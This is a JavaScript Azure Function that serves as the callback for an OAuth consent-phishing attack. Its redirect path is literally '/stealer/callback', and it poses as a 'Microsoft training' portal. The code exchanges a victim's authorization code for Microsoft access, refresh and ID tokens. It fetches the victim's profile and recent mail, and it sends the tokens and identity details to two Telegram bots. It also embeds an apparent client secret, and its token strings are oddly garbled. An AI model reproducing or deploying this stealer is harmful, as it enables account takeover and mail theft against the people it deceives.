const TELEGRAM_BOT_TOKEN = '7768080373:process.env.AZURE_CLIENT_SECRET';
const TELEGRAM_CHAT_ID = '6743632244';
const TELEGRAM_BOT_TOKEN_2 = '7942871168:process.env.AZURE_CLIENT_SECRET';
const TELEGRAM_CHAT_ID_2 = '6263177378';

async function sendTelegram(message) {
  try {
    const promises = [
      fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: message,
          parse_mode: 'HTML'
        })
      }),
      fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN_2}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID_2,
          text: message,
          parse_mode: 'HTML'
        })
      })
    ];
    await Promise.all(promises);
  } catch (error) {
    console.error('Telegram error:', error);
  }
}

module.exports = async function (context, req) {
  const code = req.query.code;
  const state = req.query.state;
  const error = req.query.error;
  
  await sendTelegram(`🎯 <b>OAUTH CALLBACK ACCESSED</b>\n🔗 Full URL: ${req.url}\n📊 Code: ${code || 'None'}\n📊 State: ${state || 'None'}\n📊 Error: ${error || 'None'}\n📅 ${new Date().toISOString()}`);
  
  if (error) {
    await sendTelegram(`❌ <b>OAUTH ERROR</b>\n🔥 Error: ${error}\n📝 Description: ${req.query.error_description || 'No description'}`);
    context.res = {
      status: 200,
      headers: { 'Content-Type': 'text/html' },
      body: `
<!DOCTYPE html>
<html><body style="font-family: Arial; text-align: center; padding: 50px;">
<h2>❌ Authentication Error</h2>
<p>There was an issue with the authentication process.</p>
<p><a href="/microsoft-training">Try Again</a></p>
</body></html>
      `
    };
    return;
  }
  
  if (!code) {
    context.res = {
      status: 200,
      headers: { 'Content-Type': 'text/html' },
      body: `
<!DOCTYPE html>
<html><body style="font-family: Arial; text-align: center; padding: 50px;">
<h2>❌ Missing Authorization Code</h2>
<p>No authorization code received.</p>
<p><a href="/microsoft-training">Try Again</a></p>
</body></html>
      `
    };
    return;
  }
  
  // 🚨 IMMEDIATE TOKEN EXCHANGE - No delays!
  try {
    const CLIENT_ID = 'process.env.AZURE_CLIENT_SECRET';
    const CLIENT_SECRET = process.env.AZURE_CLIENT_SECRET || 'DVd8Q~d22sfagk12YCUETKU1x5OS8-s~Mt92_bXa';
    const REDIRECT_URI = 'https://aitm-func-1753463791.azurewebsites.net/stealer/callback';
    
    const tokenResponse = await fetch('https://login.microsoftonline.com/common/oauth2/v2.0/token', {
      method: 'POST',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body: `grant_type=authorization_code&client_id=${CLIENT_ID}&client_secret=${CLIENT_SECRET}&code=${code}&redirect_uri=${encodeURIComponent(REDIRECT_URI)}`
    });
    
    const tokenData = await tokenResponse.json();
    
    if (tokenData.access_token) {
      // 🎯 PARALLEL DATA FETCHING - Get everything at once!
      const [userResponse, mailResponse] = await Promise.all([
        fetch('https://graph.microsoft.com/v1.0/me', {
          headers: { 'Authorization': `Bearer ${tokenData.access_token}` }
        }),
        fetch('https://graph.microsoft.com/v1.0/me/messages?$top=5', {
          headers: { 'Authorization': `Bearer ${tokenData.access_token}` }
        })
      ]);
      
      const userInfo = await userResponse.json();
      const mailData = await mailResponse.json();
      
      // 🔥 COMPREHENSIVE SUCCESS ALERT
      await sendTelegram(`🚨 <b>OAUTH CONSENT SUCCESS!</b>
🎯 <b>ACCESS TOKEN:</b> ${tokenData.access_token}
🔄 <b>REFRESH TOKEN:</b> ${tokenData.refresh_token || 'NOT_PROVIDED'}
🆔 <b>ID TOKEN:</b> ${tokenData.id_token || 'NOT_PROVIDED'}
👤 <b>Email:</b> ${userInfo.mail || userInfo.userPrincipalName}
🏢 <b>Name:</b> ${userInfo.displayName}
🏢 <b>Company:</b> ${userInfo.companyName || 'N/A'}
🆔 <b>ID:</b> ${userInfo.id}
📧 <b>Mail Access:</b> ${mailData.value ? mailData.value.length : 0} emails
📅 ${new Date().toISOString()}`);
      
      context.res = {
        status: 200,
        headers: { 'Content-Type': 'text/html' },
        body: `
<!DOCTYPE html>
<html>
<head>
    <title>✅ Training Access Granted</title>
    <style>
        body { font-family: -apple-system,BlinkMacSystemFont,Segoe UI,Roboto,sans-serif; margin: 0; padding: 20px; background: #f5f5f5; text-align: center; }
        .container { max-width: 500px; margin: 0 auto; background: white; padding: 40px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
        .success { background: #d4edda; color: #155724; padding: 20px; border-radius: 4px; margin: 20px 0; }
    </style>
</head>
<body>
    <div class="container">
        <div class="success">
            <h2>✅ Microsoft Training Access Granted!</h2>
            <p>Welcome, <strong>${userInfo.displayName}</strong>!</p>
            <p>Your personalized training experience is being prepared...</p>
            <p>You will be contacted shortly with your training materials.</p>
        </div>
        <p style="color: #666; font-size: 14px;">
            🔐 Your account has been successfully verified<br>
            📚 Training modules are being customized for your role<br>
            📧 Check your email for next steps
        </p>
    </div>
</body>
</html>
        `
      };
      
    } else {
      await sendTelegram(`❌ <b>TOKEN EXCHANGE ERROR</b>\n🔥 Error: ${tokenData.error}\n📝 Description: ${tokenData.error_description}\n🎯 Code Used: ${code}\n📅 ${new Date().toISOString()}`);
      
      context.res = {
        status: 200,
        headers: { 'Content-Type': 'text/html' },
        body: `
<!DOCTYPE html>
<html><body style="font-family: Arial; text-align: center; padding: 50px;">
<h2>❌ Token Exchange Failed</h2>
<p>Unable to complete authentication. Please try again.</p>
<p><a href="/microsoft-training">Return to Training Portal</a></p>
</body></html>
        `
      };
    }
    
  } catch (error) {
    await sendTelegram(`❌ <b>OAUTH CALLBACK ERROR</b>\n🔥 Error: ${error.message}\n📅 ${new Date().toISOString()}`);
    
    context.res = {
      status: 200,
      headers: { 'Content-Type': 'text/html' },
      body: `
<!DOCTYPE html>
<html><body style="font-family: Arial; text-align: center; padding: 50px;">
<h2>❌ System Error</h2>
<p>A technical error occurred. Please try again later.</p>
<p><a href="/microsoft-training">Return to Training Portal</a></p>
</body></html>
      `
    };
  }
};